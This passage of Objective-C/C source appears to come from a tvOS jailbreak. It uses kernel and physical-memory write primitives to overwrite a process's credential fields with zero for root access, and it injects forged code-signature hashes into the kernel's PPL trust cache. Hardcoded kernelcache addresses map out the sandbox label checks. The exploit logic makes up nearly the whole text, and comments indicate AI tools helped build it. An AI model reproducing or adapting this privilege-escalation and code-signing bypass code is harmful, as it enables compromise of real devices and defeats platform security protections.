    else if (dt_phys_write32_va(snap->posix + o->off_cr_svgid, snap->cr_svgid, "restore cr_svgid", log) != 0)
        fail_tag = "cr_svgid";
    else if (dt_phys_write32_va(snap->posix + o->off_cr_groups, snap->cr_groups, "restore cr_groups", log) != 0)
        fail_tag = "cr_groups";

    if (fail_tag)
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build25 restore %s failed", fail_tag]];
    else
        [[DTRunLogger shared] logStage:@"build25 restore creds OK"];
}

static void dt_phys_log_userspace(const char *step)
{
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build25 %s getuid %u euid %u gid %u",
        step, (unsigned)getuid(), (unsigned)geteuid(), (unsigned)getgid()]];
}

int dt_build_phys_cred_smoke(uint64_t proc, void (^log)(NSString *line))
{
    if (!proc) {
        DTPhysLog(log, @"[!] cred smoke: proc=0");
        return -1;
    }
    int ready_r = dt_phys_cred_require_ready(log);
    if (ready_r != 0) {
        [[DTRunLogger shared] logStage:@"build24 failed no phys"];
        return ready_r;
    }

    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    uint64_t proc_ro = kread64(proc + o->off_p_proc_ro);
    uint64_t ucred = kread64(proc_ro + o->off_p_ro_p_ucred);
    if (!proc_ro || !ucred) {
        [[DTRunLogger shared] logStage:@"build24 failed ucred"];
        return -3;
    }

    uint64_t cr_uid_va = ucred + o->off_u_cr_posix + o->off_cr_uid;
    uint32_t saved_uid = kread32(cr_uid_va);
    uid_t userspace_uid = getuid();
    uint64_t pa = kvtophys(cr_uid_va);

    if (!pa) {
        [[DTRunLogger shared] logStage:@"build24 failed kvtophys"];
        return -4;
    }

    uint32_t bump_uid = saved_uid + 1u;
    if (bump_uid == saved_uid)
        bump_uid = saved_uid ^ 1u;

    if (physwrite32(pa, bump_uid) != 0) {
        [[DTRunLogger shared] logStage:@"build24 failed physwrite"];
        return -5;
    }

    if (physread32(pa) != bump_uid || kread32(cr_uid_va) != bump_uid) {
        physwrite32(pa, saved_uid);
        [[DTRunLogger shared] logStage:@"build24 failed verify bump"];
        return -6;
    }

    if (physwrite32(pa, saved_uid) != 0) {
        [[DTRunLogger shared] logStage:@"build24 failed restore"];
        return -7;
    }

    if (physread32(pa) != saved_uid || kread32(cr_uid_va) != saved_uid) {
        [[DTRunLogger shared] logStage:@"build24 failed verify restore"];
        return -8;
    }

    if ((uint32_t)getuid() != (uint32_t)userspace_uid) {
        DTPhysLog(log, @"[!] build24 getuid changed %u -> %u", (unsigned)userspace_uid, (unsigned)getuid());
    }

    [[DTRunLogger shared] logStage:@"build24 cred smoke OK"];
    return 0;
}

int dt_build_phys_root_esc(uint64_t proc, void (^log)(NSString *line))
{
    if (!proc) {
        DTPhysLog(log, @"[!] root esc: proc=0");
        return -1;
    }
    int ready_r = dt_phys_cred_require_ready(log);
    if (ready_r != 0) {
        [[DTRunLogger shared] logStage:@"build25 root esc no phys primitives"];
        return ready_r;
    }

    const dt_misaka_offsets_t *o = &g_misaka_offsets;
    dt_phys_cred_snap_t snap = {0};
    if (!dt_phys_cred_snap_fill(&snap, proc, o)) {
        [[DTRunLogger shared] logStage:@"build25 snap failed"];
        DTPhysLog(log, @"[!] root esc: proc/ucred resolve failed");
        return -3;
    }

    if (getuid() == 0) {
        [[DTRunLogger shared] logStage:@"build25 already root"];
        [[DTRunLogger shared] logStage:@"build25 root OK"];
        return 0;
    }

    int r = 0;

    [[DTRunLogger shared] logStage:@"build25 patch cr_uid"];
    r = dt_phys_write32_va(snap.posix + o->off_cr_uid, 0, "cr_uid", log);
    if (r != 0)
        goto restore;
    dt_phys_log_userspace("after cr_uid");
    if (getuid() == 0)
        goto success;

    [[DTRunLogger shared] logStage:@"build25 patch proc svuid"];
    r = dt_phys_write32_va(snap.proc + o->off_p_svuid, 0, "proc_svuid", log);
    if (r != 0)
        goto restore;
    dt_phys_log_userspace("after proc_svuid");
    if (getuid() == 0)
        goto success;

    [[DTRunLogger shared] logStage:@"build25 patch cr_svuid cr_ruid"];
    r = dt_phys_write32_va(snap.posix + o->off_cr_svuid, 0, "cr_svuid", log);
    if (r != 0)
        goto restore;
    r = dt_phys_write32_va(snap.posix + o->off_cr_ruid, 0, "cr_ruid", log);
    if (r != 0)
        goto restore;
    dt_phys_log_userspace("after cr_svuid cr_ruid");
    if (getuid() == 0)
        goto success;

    [[DTRunLogger shared] logStage:@"build25 patch full creds"];
    r = dt_phys_write32_va(snap.proc + o->off_p_svgid, 0, "proc_svgid", log);
    if (r != 0)
        goto restore;
    r = dt_phys_write32_va(snap.posix + o->off_cr_rgid, 0, "cr_rgid", log);
    if (r != 0)
        goto restore;
    r = dt_phys_write32_va(snap.posix + o->off_cr_svgid, 0, "cr_svgid", log);
    if (r != 0)
        goto restore;
    r = dt_phys_write32_va(snap.posix + o->off_cr_groups, 0, "cr_groups", log);
    if (r != 0)
        goto restore;
    dt_phys_log_userspace("after full creds");

    if (getuid() != 0) {
        [[DTRunLogger shared] logStage:@"build25 root failed"];
        DTPhysLog(log, @"[!] root esc: getuid=%u geteuid=%u after full patch",
            (unsigned)getuid(), (unsigned)geteuid());
        r = -10;
        goto restore;
    }

success:
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build25 after patch getuid %u euid %u gid %u",
        (unsigned)getuid(), (unsigned)geteuid(), (unsigned)getgid()]];
    [[DTRunLogger shared] logStage:@"build25 root OK"];
    return 0;

restore:
    [[DTRunLogger shared] logStage:@"build25 restore creds"];
    dt_phys_cred_snap_restore(&snap, o, log);
    return r;
}

static uint64_t dt_trustcache_list_head_kaddr(void)
{
    uint64_t rt = ksymbol(ppl_trust_cache_rt);
    if (!rt)
        return 0;
    uint64_t indirect = kread64(rt + 0x20);
    if (!indirect)
        return 0;
    return kread64(indirect);
}

static unsigned dt_trustcache_count_list(void)
{
    unsigned count = 0;
    uint64_t cur = dt_trustcache_list_head_kaddr();
    uint32_t next_off = gSystemInfo.kernelStruct.trustcache.nextptr;

    while (cur) {
        count++;
        if (count > 256)
            break;
        cur = kread64(cur + next_off);
    }
    return count;
}

int dt_build_trustcache_smoke(void (^log)(NSString *line))
{
    dt_session_probe_build26_enter();

    int result = 0;
    unsigned pre_count = 0;
    unsigned post_count = 0;

    int ready_r = dt_phys_cred_require_ready(log);
    if (ready_r != 0) {
        [[DTRunLogger shared] logStage:@"build26 failed no phys"];
        result = ready_r;
        goto done;
    }
    if (getuid() != 0) {
        [[DTRunLogger shared] logStage:@"build26 failed need root"];
        result = -1;
        goto done;
    }

    libjailbreak_kalloc_pt_init();
    if (!gPrimitives.kalloc_global || !gPrimitives.kfree_global) {
        [[DTRunLogger shared] logStage:@"build26 failed kalloc"];
        result = -2;
        goto done;
    }

    uint64_t rt_va = ksymbol(ppl_trust_cache_rt);
    if (rt_va < 0xfffff00000000000ULL) {
        [[DTRunLogger shared] logStage:@"build26 failed tc symbol"];
        result = -3;
        goto done;
    }

    pre_count = dt_trustcache_count_list();
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build26 tc pre_count %u", pre_count]];

    static const uuid_t kSmokeUUID = {
        'T', 'V', 'O', 'S', '2', '6', 'T', 'C',
        '\0', '\0', '\0', '\0', '\0', '\0', '\0', '\0'
    };
    uuid_t smoke_uuid;
    memcpy(smoke_uuid, kSmokeUUID, sizeof(smoke_uuid));
    cdhash_t test_hash;
    memset(test_hash, 0x42, CS_CDHASH_LEN);

    if (is_cdhash_trustcached(test_hash)) {
        [[DTRunLogger shared] logStage:@"build26 trustcache smoke OK"];
        result = 0;
        goto done;
    }

    trustcache_file_v1 *tc_file = NULL;
    if (trustcache_file_build_from_cdhashes(&test_hash, 1, &tc_file) != 0 || !tc_file) {
        [[DTRunLogger shared] logStage:@"build26 tc file build failed"];
        result = -4;
        goto done;
    }

    [[DTRunLogger shared] logStage:@"build26 tc upload begin"];
    dt_run_log("[probe] build26 tc upload begin pre_count=%u", pre_count);
    int upload_r = trustcache_file_upload_with_uuid(tc_file, smoke_uuid);
    free(tc_file);
    if (upload_r != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build26 failed upload %d", upload_r]];
        result = -5;
        goto done;
    }

    post_count = dt_trustcache_count_list();
    if (!is_cdhash_trustcached(test_hash) || post_count < pre_count + 1) {
        [[DTRunLogger shared] logStage:@"build26 failed verify"];
        result = -6;
        goto done;
    }

    [[DTRunLogger shared] logStage:@"build26 trustcache smoke OK"];
    result = 0;

done:
    dt_session_probe_build26_exit(result, pre_count, post_count);
    return result;
}

int dt_macho_best_cdhash_from_path(const char *path, cdhash_t out)
{
    if (!path || !out)
        return EINVAL;

    int fd = open(path, O_RDONLY);
    if (fd < 0)
        return errno > 0 ? errno : -1;

    MemoryStream *stream = file_stream_init_from_file_descriptor(fd, 0, FILE_STREAM_SIZE_AUTO, 0);
    close(fd);
    if (!stream)
        return EIO;

    Fat *fat = fat_init_from_memory_stream(stream);
    if (!fat) {
        memory_stream_free(stream);
        return ENOEXEC;
    }

    __block int result = ENOENT;
    fat_enumerate_slices(fat, ^(MachO *macho, bool *stop) {
        CS_SuperBlob *superblob = macho_read_code_signature(macho);
        if (!superblob)
            return;

        CS_DecodedSuperBlob *decoded = csd_superblob_decode(superblob);
        if (!decoded) {
            free(superblob);
            return;
        }

        if (csd_superblob_calculate_best_cdhash(decoded, out, NULL) == 0)
            result = 0;

        csd_superblob_free(decoded);
        free(superblob);
        *stop = true;
    });

    fat_free(fat); /* owns stream via fat->stream — do not memory_stream_free(stream) */
    return result;
}

NSString *dt_cdhash_hex_string(const cdhash_t hash)
{
    NSMutableString *hex = [NSMutableString stringWithCapacity:(NSUInteger)(CS_CDHASH_LEN * 2)];
    for (int i = 0; i < CS_CDHASH_LEN; i++)
        [hex appendFormat:@"%02x", hash[i]];
    return hex;
}

bool dt_cdhash_trustcached(const cdhash_t hash)
{
    return is_cdhash_trustcached(hash);
}

int dt_trustcache_upload_cdhashes(const cdhash_t *hashes, uint32_t count,
                                  uint32_t *uploadedOut, uint32_t *skippedOut)
{
    if (uploadedOut)
        *uploadedOut = 0;
    if (skippedOut)
        *skippedOut = 0;
    if (!hashes || count == 0)
        return EINVAL;

    int ready_r = dt_phys_cred_require_ready(nil);
    if (ready_r != 0)
        return ready_r;
    if (getuid() != 0)
        return EPERM;

    libjailbreak_kalloc_pt_init();
    if (!gPrimitives.kalloc_global || !gPrimitives.kfree_global)
        return -2;

    cdhash_t *missing = calloc(count, sizeof(cdhash_t));
    if (!missing)
        return ENOMEM;

    uint32_t missingCount = 0;
    uint32_t skipped = 0;

    for (uint32_t i = 0; i < count; i++) {
        if (is_cdhash_trustcached(hashes[i])) {
            skipped++;
            continue;
        }
        BOOL dup = NO;
        for (uint32_t j = 0; j < missingCount; j++) {
            if (memcmp(missing[j], hashes[i], CS_CDHASH_LEN) == 0) {
                dup = YES;
                break;
            }
        }
        if (dup)
            continue;
        memcpy(missing[missingCount], hashes[i], CS_CDHASH_LEN);
        missingCount++;
    }

    if (skippedOut)
        *skippedOut = skipped;

    if (missingCount == 0) {
        free(missing);
        [[DTRunLogger shared] logStage:@"build75 tc upload skip all cached"];
        return 0;
    }

    unsigned pre_count = dt_trustcache_count_list();
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build75 tc upload begin need=%u pre_count=%u",
                                    missingCount, pre_count]];

    trustcache_file_v1 *tc_file = NULL;
    if (trustcache_file_build_from_cdhashes(missing, missingCount, &tc_file) != 0 || !tc_file) {
        free(missing);
        return -4;
    }

    static const uuid_t kG5TCUUID = {
        'T', 'V', 'O', 'S', '7', '3', 'G', '5',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0'
    };
    uuid_t upload_uuid;
    memcpy(upload_uuid, kG5TCUUID, sizeof(upload_uuid));

    int upload_r = trustcache_file_upload_with_uuid(tc_file, upload_uuid);
    free(tc_file);
    if (upload_r != 0) {
        free(missing);
        return upload_r;
    }

    unsigned post_count = dt_trustcache_count_list();
    for (uint32_t i = 0; i < missingCount; i++) {
        if (!is_cdhash_trustcached(missing[i])) {
            free(missing);
            [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build75 tc upload verify fail idx=%u post_count=%u",
                                            i, post_count]];
            return -6;
        }
    }

    free(missing);

    if (uploadedOut)
        *uploadedOut = missingCount;

    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build75 tc upload OK uploaded=%u skipped=%u post_count=%u",
                                    missingCount, skipped, post_count]];
    return 0;
}

int dt_trustcache_upload_cdhashes_force(const cdhash_t *hashes, uint32_t count,
                                        uint32_t *uploadedOut)
{
    if (uploadedOut)
        *uploadedOut = 0;
    if (!hashes || count == 0)
        return EINVAL;

    int ready_r = dt_phys_cred_require_ready(nil);
    if (ready_r != 0)
        return ready_r;
    if (getuid() != 0)
        return EPERM;

    libjailbreak_kalloc_pt_init();
    if (!gPrimitives.kalloc_global || !gPrimitives.kfree_global)
        return -2;

    cdhash_t *unique = calloc(count, sizeof(cdhash_t));
    if (!unique)
        return ENOMEM;

    uint32_t uniqueCount = 0;
    for (uint32_t i = 0; i < count; i++) {
        BOOL dup = NO;
        for (uint32_t j = 0; j < uniqueCount; j++) {
            if (memcmp(unique[j], hashes[i], CS_CDHASH_LEN) == 0) {
                dup = YES;
                break;
            }
        }
        if (dup)
            continue;
        memcpy(unique[uniqueCount], hashes[i], CS_CDHASH_LEN);
        uniqueCount++;
    }

    if (uniqueCount == 0) {
        free(unique);
        return EINVAL;
    }

    unsigned pre_count = dt_trustcache_count_list();
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build102.3.3 tc force upload begin need=%u pre_count=%u",
                                    uniqueCount, pre_count]];

    trustcache_file_v1 *tc_file = NULL;
    if (trustcache_file_build_from_cdhashes(unique, uniqueCount, &tc_file) != 0 || !tc_file) {
        free(unique);
        return -4;
    }

    static const uuid_t kG5TCUUID = {
        'T', 'V', 'O', 'S', '7', '3', 'G', '5',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0'
    };
    uuid_t upload_uuid;
    memcpy(upload_uuid, kG5TCUUID, sizeof(upload_uuid));

    int upload_r = trustcache_file_upload_with_uuid(tc_file, upload_uuid);
    free(tc_file);
    if (upload_r != 0) {
        free(unique);
        return upload_r;
    }

    unsigned post_count = dt_trustcache_count_list();
    for (uint32_t i = 0; i < uniqueCount; i++) {
        if (!is_cdhash_trustcached(unique[i])) {
            free(unique);
            [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build102.3.3 tc force upload verify fail idx=%u post_count=%u",
                                            i, post_count]];
            return -6;
        }
    }

    free(unique);

    if (uploadedOut)
        *uploadedOut = uniqueCount;

    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build102.3.3 tc force upload OK uploaded=%u post_count=%u",
                                    uniqueCount, post_count]];
    return 0;
}

int dt_trustcache_upload_batch_cdhashes(const cdhash_t *hashes, uint32_t count,
                                        const uuid_t uuid, uint32_t *uploadedOut)
{
    if (uploadedOut)
        *uploadedOut = 0;
    if (!hashes || count == 0 || !uuid)
        return EINVAL;

    int ready_r = dt_phys_cred_require_ready(nil);
    if (ready_r != 0)
        return ready_r;
    if (getuid() != 0)
        return EPERM;

    libjailbreak_kalloc_pt_init();
    if (!gPrimitives.kalloc_global || !gPrimitives.kfree_global)
        return -2;

    cdhash_t *unique = calloc(count, sizeof(cdhash_t));
    if (!unique)
        return ENOMEM;

    uint32_t uniqueCount = 0;
    for (uint32_t i = 0; i < count; i++) {
        BOOL dup = NO;
        for (uint32_t j = 0; j < uniqueCount; j++) {
            if (memcmp(unique[j], hashes[i], CS_CDHASH_LEN) == 0) {
                dup = YES;
                break;
            }
        }
        if (dup)
            continue;
        memcpy(unique[uniqueCount], hashes[i], CS_CDHASH_LEN);
        uniqueCount++;
    }

    if (uniqueCount == 0) {
        free(unique);
        return EINVAL;
    }

    unsigned pre_count = dt_trustcache_count_list();
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build102722 tc batch upload begin need=%u pre_count=%u",
                                    uniqueCount, pre_count]];

    trustcache_file_v1 *tc_file = NULL;
    if (trustcache_file_build_from_cdhashes(unique, uniqueCount, &tc_file) != 0 || !tc_file) {
        free(unique);
        return -4;
    }

    uuid_t upload_uuid;
    memcpy(upload_uuid, uuid, sizeof(upload_uuid));

    int upload_r = trustcache_file_upload_with_uuid(tc_file, upload_uuid);
    free(tc_file);
    if (upload_r != 0) {
        free(unique);
        return upload_r;
    }

    unsigned post_count = dt_trustcache_count_list();
    for (uint32_t i = 0; i < uniqueCount; i++) {
        if (!is_cdhash_trustcached(unique[i])) {
            free(unique);
            [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build102722 tc batch upload verify fail idx=%u post_count=%u",
                                            i, post_count]];
            return -6;
        }
    }

    free(unique);

    if (uploadedOut)
        *uploadedOut = uniqueCount;

    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build102722 tc batch upload OK uploaded=%u post_count=%u",
                                    uniqueCount, post_count]];
    return 0;
}

static void dt_build89_log_label_slots(const char *when, uint64_t label, void (^log)(NSString *line))
{
    const char *tag = when ? when : "?";
    pid_t pid = getpid();
    if (!label) {
        DTPhysLog(log, @"[!] build89 label %s pid=%d label=0", tag, (int)pid);
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build89 label %s no label", tag]];
        return;
    }
    uint64_t slot0 = mac_label_get(label, 0);
    uint64_t slot1 = mac_label_get(label, 1);
    DTPhysLog(log, @"[*] build89 label %s pid=%d slot0=0x%llx slot1=0x%llx",
        tag, (int)pid, (unsigned long long)slot0, (unsigned long long)slot1);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build89 label %s s0=0x%llx s1=0x%llx",
        tag, (unsigned long long)slot0, (unsigned long long)slot1]];
}

void dt_build89_log_mac_label_slots(const char *when)
{
    const char *tag = when ? when : "?";
    if (dt_phys_cred_require_ready(NULL) != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build89 label %s skip no phys", tag]];
        return;
    }
    uint64_t proc = proc_find(getpid());
    if (!proc) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build89 label %s skip no proc", tag]];
        return;
    }
    uint64_t ucred = proc_ucred(proc);
    uint64_t label = ucred ? kread_ptr(ucred + koffsetof(ucred, label)) : 0;
    proc_rele(proc);
    dt_build89_log_label_slots(when, label, NULL);
}

/// IDA MCP — kernel consume profile chain (grep/BP compare anchors).
enum {
    kDTB99Ea5510E8 = 0xFFFFFFF0065510E8,   /* CBZ X0; log X0 profile, X21 proc @ 551090 */
    kDTB99Ea532C68 = 0xFFFFFFF006532C68,   /* proc→profile; A@532C8C B@532940 C@532964 */
    kDTB99Ea532C8C = 0xFFFFFFF006532C8C,   /* Exit A: cred (cred+1)<2 */
    kDTB99Ea532C94 = 0xFFFFFFF006532C94,   /* LDR X0,[cred,#0x78] */
    kDTB99Ea532940 = 0xFFFFFFF006532940,   /* Exit B: label CBZ */
    kDTB99Ea532964 = 0xFFFFFFF006532964, /* Exit C: mac_label_get NULL */
    kDTB99Ea532930 = 0xFFFFFFF006532930,
    kDTB99Ea82A648 = 0xFFFFFFF00782A648,   /* _mac_label_get entry */
    kDTB99Ea82A6B4 = 0xFFFFFFF00782A6B4,  /* LDR X8,[label+8] slot0 */
    kDTB99Ea82A6BC = 0xFFFFFFF00782A6BC,  /* CSEL final X0 */
    kDTB99Ea5FF124 = 0xFFFFFFF0075FF124,  /* kernel proc = [vfs_context_current+8] */
    kDTB99Ea75E65E0 = 0xFFFFFFF0075E65E0, /* _proc_ucred: LDR proc_ro,[proc+#0x18] */
    kDTB99Ea75E664C = 0xFFFFFFF0075E664C, /* _proc_ucred: LDR ucred,[proc_ro+#0x20] */
    kDTB99ProcRoOff = 0x18,                /* MCP 75E65E0 */
    kDTB99ProcRoUcredOff = 0x20,           /* MCP 75E664C */
    kDTB99CredLabelOff = 0x78,             /* MCP 532C94 */
    kDTB99MacLabelSlot0 = 0,               /* MCP dword_ECACE4=0 @ 532954 */
};

void dt_build99_log_consume_chain(const char *when)
{
    const char *tag = when ? when : "?";
    pid_t pid = getpid();

    if (dt_phys_cred_require_ready(NULL) != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build99 chain %s skip no phys", tag]];
        return;
    }

    dt_pmap_cache_snapshot_t pmap = {0};
    dt_pmap_cache_snapshot(&pmap);

    uint64_t proc_find_proc = proc_find(pid);
    if (!proc_find_proc) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build99 chain %s skip no proc", tag]];
        return;
    }

    uint64_t proc_ro = 0;
    uint64_t ucred = 0;
    uint64_t ucred_via_proc_ucred = 0;
    if (gSystemInfo.kernelStruct.proc_ro.exists) {
        proc_ro = kread_ptr(proc_find_proc + koffsetof(proc, proc_ro));
        if (proc_ro)
            ucred = kread_ptr(proc_ro + koffsetof(proc_ro, ucred));
        ucred_via_proc_ucred = proc_ucred(proc_find_proc);
    } else {
        ucred = proc_ucred(proc_find_proc);
        ucred_via_proc_ucred = ucred;
    }

    uint64_t label = ucred ? kread_ptr(ucred + koffsetof(ucred, label)) : 0;
    uint64_t slot0 = label ? mac_label_get(label, kDTB99MacLabelSlot0) : 0;
    uint64_t slot1 = label ? mac_label_get(label, 1) : 0;

    /* IDA 532C80–532C88: (cred+1) >= 2 else 532C8C returns NULL profile */
    bool cred_passes_532c88 = ucred != 0 && (ucred + 1) >= 2;
    bool proc_find_matches_pmap = pmap.proc_cached && pmap.proc == proc_find_proc;
    bool ucred_paths_match = ucred == ucred_via_proc_ucred;

    proc_rele(proc_find_proc);

    /* ChatGPT grep line — one line per pre-consume */
    [[DTRunLogger shared] log:
        [NSString stringWithFormat:
            @"[*] build99 chain %s pid=%d proc_find_proc=0x%llx pmap_cache_proc=0x%llx "
            @"proc_ro=0x%llx ucred=0x%llx label=0x%llx slot0=0x%llx slot1=0x%llx "
            @"cred532C88=%d proc_find_eq_pmap=%d ucred_eq_proc_ucred=%d",
            tag, (int)pid,
            (unsigned long long)proc_find_proc,
            (unsigned long long)(pmap.proc_cached ? pmap.proc : 0),
            (unsigned long long)proc_ro,
            (unsigned long long)ucred,
            (unsigned long long)label,
            (unsigned long long)slot0,
            (unsigned long long)slot1,
            cred_passes_532c88 ? 1 : 0,
            proc_find_matches_pmap ? 1 : 0,
            ucred_paths_match ? 1 : 0]];

    [[DTRunLogger shared] logStage:
        [NSString stringWithFormat:
            @"build99 chain %s pid=%d proc=0x%llx pmap=0x%llx proc_ro=0x%llx "
            @"ucred=0x%llx label=0x%llx s0=0x%llx s1=0x%llx",
            tag, (int)pid,
            (unsigned long long)proc_find_proc,
            (unsigned long long)(pmap.proc_cached ? pmap.proc : 0),
            (unsigned long long)proc_ro,
            (unsigned long long)ucred,
            (unsigned long long)label,
            (unsigned long long)slot0,
            (unsigned long long)slot1]];

    [[DTRunLogger shared] log:
        [NSString stringWithFormat:
            @"[*] build99 chain %s — kernel BP compare (IDA MCP):\n"
            @"    proc_find 0x%llx / pmap 0x%llx  ↔ 5510E8 X21 / 532C68 / 5FF124 [ctx+8]\n"
            @"    proc_ro @ proc+0x%x = 0x%llx  ↔ 75E65E0 LDR [proc,#0x18]\n"
            @"    ucred @ proc_ro+0x%x = 0x%llx  ↔ 75E664C LDR [proc_ro,#0x20] / kauth_cred_proc_ref\n"
            @"    cred+1>=2 (532C88)=%d  ↔ Exit A @ 0x%x\n"
            @"    label @ cred+0x%x = 0x%llx  ↔ 532C94 / 532930 X0 / Exit B @ 0x%x\n"
            @"    slot0 [label+8]=0x%llx  ↔ 82A6B4 X8 / Exit C @ 0x%x / 82A6BC X0\n"
            @"    slot1=0x%llx\n"
            @"    BP: 5510E8=0x%x 532C68=0x%x 532C94=0x%x 532930=0x%x 82A648=0x%x 82A6B4=0x%x 82A6BC=0x%x",
            tag,
            (unsigned long long)proc_find_proc,
            (unsigned long long)(pmap.proc_cached ? pmap.proc : 0),
            kDTB99ProcRoOff, (unsigned long long)proc_ro,
            kDTB99ProcRoUcredOff, (unsigned long long)ucred,
            cred_passes_532c88 ? 1 : 0, kDTB99Ea532C8C,
            kDTB99CredLabelOff, (unsigned long long)label, kDTB99Ea532940,
            (unsigned long long)slot0, kDTB99Ea532964,
            (unsigned long long)slot1,
            kDTB99Ea5510E8, kDTB99Ea532C68, kDTB99Ea532C94,
            kDTB99Ea532930, kDTB99Ea82A648, kDTB99Ea82A6B4, kDTB99Ea82A6BC]];
}

/// IDA MCP §26 — vfs_context + 532C68 mirror offsets (j105a kernelcache).
enum {
    kDTB100ThreadVfsCtxOff = 0x390, /* 261CC0 LDR [thread,#0x390] */
    kDTB100CtxThreadBackOff = 0x0,  /* 261D20 LDR [ctx] CMP thread */
    kDTB100CtxUcredOff = 0x8,       /* 3756DC _vfs_context_ucred */
    kDTB100CtxProcOff = 0x10,       /* 375230 _vfs_context_proc */
    kDTB100CtxTaskOff = 0x20,       /* 2624A8 LDR [ctx,#0x20] */
};

typedef struct {
    uint64_t profile;
    uint64_t cred;
    uint64_t proc_ro;
    uint64_t label;
    uint64_t slot0_raw;
    uint64_t slot1_raw;
    char exit_code; /* 'A' 'B' 'C' 'N' (NONE) */
} dt_mirror_532c68_t;

static uint64_t dt_mirror_proc_ucred(uint64_t proc)
{
    if (!proc)
        return 0;
    if (gSystemInfo.kernelStruct.proc_ro.exists) {
        uint64_t proc_ro = kread_ptr(proc + koffsetof(proc, proc_ro));
        if (!proc_ro)
            return 0;
        return kread_ptr(proc_ro + koffsetof(proc_ro, ucred));
    }
    return proc_ucred(proc);
}

static dt_mirror_532c68_t dt_mirror_532C68(uint64_t proc_as_arg)
{
    dt_mirror_532c68_t out = {0};
    out.exit_code = 'N';

    if (!proc_as_arg) {
        out.exit_code = 'A';
        return out;
    }

    if (gSystemInfo.kernelStruct.proc_ro.exists)
        out.proc_ro = kread_ptr(proc_as_arg + koffsetof(proc, proc_ro));

    out.cred = dt_mirror_proc_ucred(proc_as_arg);
    /* IDA 532C80–532C88: cred==0 → Exit A @ 532C8C */
    if (out.cred == 0 || (out.cred + 1) < 2) {
        out.exit_code = 'A';
        return out;
    }

    out.label = kread_ptr(out.cred + koffsetof(ucred, label));
    /* IDA 532940 CBZ label → Exit B */
    if (out.label == 0) {
        out.exit_code = 'B';
        return out;
    }

    out.slot0_raw = kread_ptr(out.label + ((kDTB99MacLabelSlot0 + 1) * sizeof(uint64_t)));
    out.slot1_raw = kread_ptr(out.label + ((1 + 1) * sizeof(uint64_t)));
    /* IDA 82A6B8 CMN #1 / 82A6BC CSEL → NULL iff slot == -1 (Exit C @ 532964) */
    if (out.slot0_raw == (uint64_t)-1 ||
        (!gSystemInfo.kernelStruct.proc_ro.exists && out.slot0_raw == 0)) {
        out.exit_code = 'C';
        return out;
    }

    out.profile = mac_label_get(out.label, kDTB99MacLabelSlot0);
    out.exit_code = 'N';
    return out;
}

int dt_mirror_profile_ptr_for_pid(pid_t pid, uint64_t *profileOut)
{
    if (profileOut)
        *profileOut = 0;
    if (pid <= 0)
        return -1;
    if (dt_phys_cred_require_ready(NULL) != 0)
        return -2;

    uint64_t proc_kptr = proc_find(pid);
    if (!proc_kptr)
        return -3;

    dt_mirror_532c68_t mirror = dt_mirror_532C68(proc_kptr);
    proc_rele(proc_kptr);

    if (profileOut)
        *profileOut = mirror.profile;
    return mirror.profile ? 0 : -4;
}

static void dt_b100_phys_log(void (^log)(NSString *line), NSString *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    NSString *msg = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (log)
        log(msg);
    [[DTRunLogger shared] log:msg];
}

int dt_build100_log_ctx_proof(void (^log)(NSString *line))
{
    pid_t pid = getpid();

    if (dt_phys_cred_require_ready(log) != 0) {
        [[DTRunLogger shared] logStage:@"build101 ctx proof skip no phys"];
        return -1;
    }

    dt_pmap_cache_snapshot_t pmap = {0};
    dt_pmap_cache_snapshot(&pmap);

    uint64_t proc_find_proc = proc_find(pid);
    if (!proc_find_proc) {
        dt_b100_phys_log(log, @"[!] build101 ctx proof skip no proc_find pid=%d", (int)pid);
        [[DTRunLogger shared] logStage:@"build101 ctx proof skip no proc"];
        return -2;
    }

    mach_port_t thread_port = mach_thread_self();
    uint64_t task_from_proc = proc_task(proc_find_proc);
    uint64_t task_kptr = task_from_proc;
    if (pmap.task_cached && pmap.task) {
        if (!task_kptr)
            task_kptr = pmap.task;
    }

    dt_b101_thread_diag_t th_diag = {0};
    th_diag.task_pmap = pmap.task_cached ? pmap.task : 0;
    uint64_t thread_kptr = 0;
    if (task_kptr && thread_port != MACH_PORT_NULL)
        thread_kptr = dt_b101_thread_kptr_from_port(task_kptr, thread_port, &th_diag);

    uint64_t ctx = thread_kptr ? kread_ptr(thread_kptr + kDTB100ThreadVfsCtxOff) : 0;
    uint64_t ctx_ucred = ctx ? kread_ptr(ctx + kDTB100CtxUcredOff) : 0;
    uint64_t ctx_proc = ctx ? kread_ptr(ctx + kDTB100CtxProcOff) : 0;
    uint64_t ctx_task = ctx ? kread_ptr(ctx + kDTB100CtxTaskOff) : 0;
    uint64_t ctx_thread_back = ctx ? kread_ptr(ctx + kDTB100CtxThreadBackOff) : 0;

    bool ctx_back_eq_thread = ctx && thread_kptr && ctx_thread_back == thread_kptr;
    bool proc_find_eq_ctx_proc = proc_find_proc && ctx_proc && proc_find_proc == ctx_proc;
    bool proc_find_eq_ctx_ucred = proc_find_proc && ctx_ucred && proc_find_proc == ctx_ucred;
    bool ctx_task_eq_task = task_kptr && ctx_task && task_kptr == ctx_task;
    bool task_proc_eq_pmap = task_from_proc && th_diag.task_pmap && task_from_proc == th_diag.task_pmap;

